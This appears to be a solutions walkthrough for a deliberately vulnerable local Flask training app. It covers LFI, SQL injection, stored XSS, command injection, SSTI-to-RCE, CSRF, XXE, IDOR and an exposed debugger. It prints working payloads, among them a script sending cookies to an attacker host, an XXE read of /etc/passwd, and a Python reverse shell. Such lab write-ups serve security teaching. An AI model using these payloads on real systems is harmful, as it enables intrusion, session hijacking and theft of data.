### LFI challenge

http://127.0.0.1:8080/find_secret?file=..\..\..\secrets.txt


### SQLi:

enter "' OR 'a'='a';--" inside the Email Address field

### XSS stored:

After logging in as a user,
Add a note such as "<script> alert(1) </script>"

Due to the insecure session management, an attacker can also retrieve the session data of the logged-in user with
the following script.

```
<script>document.location='http://veryevilhacker.com?cookie='+document.cookie</script>
```

An attacker hosting the malicious site can look at the log data and sees the user's cookie value to authenticate as the user.


### Command injection:


go to http://127.0.0.1:8080/ping and

enter "127.0.0.1 | whoami"


### XSS Reflected:


### SSTI:

Vulnerable Endpoint: http://127.0.0.1:8080/find_secret?file=

If you supply a file name that doesn't exist on the backend, it shows an error such as "404 page not found: the resource does not exist!".

Since the template is being used insecurely, it's vulnerable to SSTI.

Simply supply {{ 7 * 7 }} for the file parameter and observe it returns 49.

We can also achieve a RCE with: (reveals the files in the current directory)

```
http://127.0.0.1:8080/find_secret?file={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20%22warning%22%20in%20x.__name__%20%}{{x()._module.__builtins__[%27__import__%27](%27os%27).popen(%22dir%22).read()}}{%endif%}{%%20endfor%20%}
```


### CSRF attack

After logging in, there's a functionality to change the current user's email.

Since the CSRF token is not implemented, attacker can craft a payload and put it inside a website to trick a user to visit the site, then submit a form to change the logged-in user's email to whatever the email attacker specifies it as.
Payload:
```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

```

#### XXE

The login page shows there's an endpoint /is_xml where a user can send a post request containing an XML file with a key:xml to check if the file is valid.
This function is vulnerable to an XXE attack.

sample payload:

Linux:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<items>
    <name>&xxe;</name>
    <price>100</price>

</items>

```


Windows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>
<items>
    <name>&xxe;</name>
    <price>100</price>

</items>
```

Upload the xml file via a POSTMAN by choosing the "form-data" option and specify the Key as "xml" and select the payload file.


### IDOR 

A logged-in user is able to enumerate other user's email addresses at /users?id=ID_NUMBER.
Essentially, any logged_in user can enumerate all the users' email addresses by going through the id values.

### Security Misconfiguration + RCE

Inside the login page, there's a comment that mentions /oauth endpoint that's under development. When a User visits this page, it shows an error.

html comment:
```html

<!--TO DO: /oauth endpoint is under development-->
```
The error page shows the flask debugger has been pushed to production and a PIN is disabled.  An attacker can open a python interactive shell by clicking the command line icon.

With python, an attacker can obtain a reverse shell or issue any command. 

Simple Command POC that opens a calculator on the target system: 
```python
#Windows
os.system('calc')
#Linux 
os.system('xcalc')
```

Reverse shell command POC:

Adjust the IP and the port for demo.
```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```
